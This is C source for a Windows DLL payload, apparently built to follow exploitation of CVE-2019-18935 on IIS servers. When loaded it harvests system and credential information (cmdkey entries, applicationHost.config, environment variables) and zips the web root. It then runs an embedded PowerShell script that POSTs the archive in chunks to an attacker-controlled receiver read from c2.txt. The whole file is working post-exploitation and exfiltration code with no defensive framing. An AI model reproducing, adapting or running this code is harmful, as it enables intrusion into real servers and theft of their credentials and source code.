#include <windows.h>
#include <stdio.h>

/*
 * exfil.c — CVE-2019-18935 payload: harvest + outbound exfil.
 *
 * Runs as the IIS app-pool identity after deserialization. Unlike dump-src.c it
 * does NOT depend on finding a writable web-served directory: it ships the loot
 * out over outbound HTTPS to a receiver read at runtime from
 * C:\Windows\Temp\c2.txt (uploaded separately, so the receiver can change
 * without a rebuild).
 *
 * Protocol (all POSTs to <base>):
 *   /manifest   name=src.zip&size=<n>&sha=<sha256>&chunks=<n>
 *   /c<i>       base64 chunk i, text/plain
 *   /done       "ok"
 *
 * Local artifacts are also written to C:\Windows\Temp for the case where a
 * writable web directory is later found.
 */

static const char *PS_SCRIPT =
    "$ErrorActionPreference='SilentlyContinue'\n"
    "$tmp='C:\\Windows\\Temp'\n"
    "$cfg=Join-Path $tmp 'c2.txt'\n"
    "if(!(Test-Path $cfg)){exit}\n"
    "$base=(Get-Content $cfg -TotalCount 1).Trim()\n"
    "if(!$base){exit}\n"
    "$zip=Join-Path $tmp 'src.zip'\n"
    "if(!(Test-Path $zip)){exit}\n"
    "$b=[IO.File]::ReadAllBytes($zip)\n"
    "$b64=[Convert]::ToBase64String($b)\n"
    "$sha=(Get-FileHash $zip -Algorithm SHA256).Hash\n"
    "$n=[int][math]::Ceiling($b64.Length/48000)\n"
    "try{Invoke-WebRequest -Uri \"$base/manifest\" -Method Post "
    "-Body \"name=src.zip&size=$($b.Length)&sha=$sha&chunks=$n\" "
    "-UseBasicParsing -TimeoutSec 30|Out-Null}catch{}\n"
    "for($i=0;$i -lt $n;$i++){\n"
    " $s=$i*48000\n"
    " $len=[math]::Min(48000,$b64.Length-$s)\n"
    " $c=$b64.Substring($s,$len)\n"
    " try{Invoke-WebRequest -Uri \"$base/c$i\" -Method Post -Body $c "
    "-ContentType 'text/plain' -UseBasicParsing -TimeoutSec 60|Out-Null}catch{}\n"
    "}\n"
    "try{Invoke-WebRequest -Uri \"$base/done\" -Method Post -Body 'ok' "
    "-UseBasicParsing -TimeoutSec 15|Out-Null}catch{}\n";

static void run(const char *cmd)
{
    system(cmd);
}

static DWORD WINAPI Worker(LPVOID lpParam)
{
    (void)lpParam;

    // Let the deserialization request unwind first.
    Sleep(300);

    // ---- 1. local recon artifacts -------------------------------------
    run("cmd /c whoami /all > C:\\Windows\\Temp\\whoami.txt 2>&1");
    run("cmd /c set > C:\\Windows\\Temp\\env.txt 2>&1");
    run("cmd /c ipconfig /all > C:\\Windows\\Temp\\ipconfig.txt 2>&1");
    run("cmd /c net localgroup administrators > C:\\Windows\\Temp\\admins.txt 2>&1");
    run("cmd /c cmdkey /list > C:\\Windows\\Temp\\creds.txt 2>&1");
    run("cmd /c dir /s /b C:\\inetpub\\wwwroot > C:\\Windows\\Temp\\tree.txt 2>&1");
    run("cmd /c type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config "
        "> C:\\Windows\\Temp\\apphost.config 2>&1");

    // ---- 2. zip the web root ------------------------------------------
    const char *roots[] = {
        "C:\\inetpub\\wwwroot",
        "C:\\inetpub\\wwwroot\\StartUp",
        "C:\\inetpub\\vhosts",
        NULL
    };
    for (int i = 0; roots[i]; i++) {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd),
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
            "try { Compress-Archive -Path '%s\\*' "
            "-DestinationPath 'C:\\Windows\\Temp\\src.zip' -Force -ErrorAction Stop }"
            " catch { exit 1 }\"", roots[i]);
        run(cmd);
        FILE *f = fopen("C:\\Windows\\Temp\\src.zip", "rb");
        if (f) {
            long sz = 0;
            fseek(f, 0, SEEK_END);
            sz = ftell(f);
            fclose(f);
            if (sz > 1000) break;
            remove("C:\\Windows\\Temp\\src.zip");
        }
    }

    // ---- 3. best-effort copy into web-served dirs ----------------------
    run("powershell -NoProfile -ExecutionPolicy Bypass -Command \""
        "foreach ($d in @('C:\\inetpub\\wwwroot','C:\\inetpub\\wwwroot\\StartUp',"
        "'C:\\inetpub\\wwwroot\\uploads','C:\\inetpub\\wwwroot\\App_Data')) { "
        "try { Copy-Item 'C:\\Windows\\Temp\\src.zip' (Join-Path $d 'src.zip') "
        "-Force -ErrorAction Stop } catch {} }\"");

    // ---- 4. outbound exfil --------------------------------------------
    FILE *f = fopen("C:\\Windows\\Temp\\exfil.ps1", "wb");
    if (f) {
        fputs(PS_SCRIPT, f);
        fclose(f);
        run("powershell -NoProfile -ExecutionPolicy Bypass "
            "-File C:\\Windows\\Temp\\exfil.ps1");
    }

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    HANDLE hThread;
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        hThread = CreateThread(0, 0, Worker, 0, 0, 0);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
